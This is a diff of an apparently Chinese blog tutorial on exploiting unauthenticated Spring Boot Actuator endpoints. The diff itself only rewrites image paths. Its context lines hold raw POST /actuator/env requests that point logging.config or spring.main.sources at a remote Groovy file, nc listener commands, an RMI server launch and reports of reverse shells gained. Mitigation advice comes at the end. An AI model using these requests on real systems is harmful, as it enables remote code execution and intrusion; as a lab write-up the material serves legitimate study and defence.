 <p>在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url</p>
 <p>例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
 <p>可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容</p>
-<p>![image-20210901142838024](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901142838024.png)</p>
+<p>![image-20210901142838024](Spring Boot Actuator未授权访问利用实战利用/image-20210901142838024.png)</p>
 <p>shell反弹成功</p>
-<p>![image-20210901145716430](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901145716430.png)</p>
+<p>![image-20210901145716430](Spring Boot Actuator未授权访问利用实战利用/image-20210901145716430.png)</p>
 <h5 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
 <li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
@@ -1230,22 +1230,22 @@
 <p>将该代码进行maven打包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204556955.png)</p>
+<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用/image-20210830204556955.png)</p>
 <p>然后指定访问ip地址开启RMI服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204855751.png)</p>
+<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用/image-20210830204855751.png)</p>
 <p>使用nc监听端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
 
 
 <p>POST方式构造请求包对/actuator/env发出请求，设置logging.config为前面example.xml的请求地址</p>
-<p>![image-20210831165413164](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831165413164.png)</p>
+<p>![image-20210831165413164](Spring Boot Actuator未授权访问利用实战利用/image-20210831165413164.png)</p>
 <p>然后再访问/actuator/restart端点重新启动项目加载变量</p>
-<p>![image-20210831165556609](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831165556609.png)</p>
+<p>![image-20210831165556609](Spring Boot Actuator未授权访问利用实战利用/image-20210831165556609.png)</p>
 <p>此时就会看到连接shell成功</p>
-<p>![image-20210831165644535](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831165644535.png)</p>
+<p>![image-20210831165644535](Spring Boot Actuator未授权访问利用实战利用/image-20210831165644535.png)</p>
 <h5 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址</li>
 <li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
@@ -1305,16 +1305,16 @@
 <p>请求报文如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831181920688.png)</p>
+<p>![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用/image-20210831181920688.png)</p>
 <p>在攻击主机上监听1234端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
 
 
 <p>然后向/actuator/restart请求重启项目</p>
-<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180134395.png)</p>
+<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用/image-20210831180134395.png)</p>
 <p>可以看到目标主机反向连接成功</p>
-<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180922722.png)</p>
+<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用/image-20210831180922722.png)</p>
 <h5 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li><p>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</p>
 </li>
@@ -1375,16 +1375,16 @@
 <p>请求报文如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210831175940842](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831175940842.png)</p>
+<p>![image-20210831175940842](Spring Boot Actuator未授权访问利用实战利用/image-20210831175940842.png)</p>
 <p>在攻击主机上监听1234端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
 
 
 <p>然后向/actuator/restart请求重启项目</p>
-<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180134395.png)</p>
+<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用/image-20210831180134395.png)</p>
 <p>可以看到目标主机反向连接成功</p>
-<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180922722.png)</p>
+<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用/image-20210831180922722.png)</p>
 <h5 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li>
 <li>restart 重启应用后，程序会请求设置的 URL 地址</li>
@@ -1394,11 +1394,11 @@
 <h1 id="3-安全措施"><a href="#3-安全措施" class="headerlink" title="3.安全措施"></a>3.安全措施</h1><h3 id="3-1开启security依赖功能"><a href="#3-1开启security依赖功能" class="headerlink" title="3.1开启security依赖功能"></a><strong>3.1开启security依赖功能</strong></h3><p>在项目的pom.xml文件下引入spring-boot-starter-security依赖</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;groupId&gt;org.springframework.boot\&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/b01ec604e001e1de3f668bcd86398f62.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/b01ec604e001e1de3f668bcd86398f62.png)</p>
 <p>然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">management.security.enabled=true</span><br><span class="line"></span><br><span class="line">security.user.name=admin</span><br><span class="line"></span><br><span class="line">security.user.password=admin</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/808449fe71e832550f82817c0ae5b3a4.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/808449fe71e832550f82817c0ae5b3a4.png)</p>
 <h3 id="3-2禁用接口"><a href="#3-2禁用接口" class="headerlink" title="3.2禁用接口"></a><strong>3.2</strong>禁用接口</h3><p>如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上Spring<br>Boot也提供了安全限制功能。比如要禁用/env接口，则可设置如下：</p>
 <p>endpoints.env.enabled= false</p>
 <p>如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：</p>
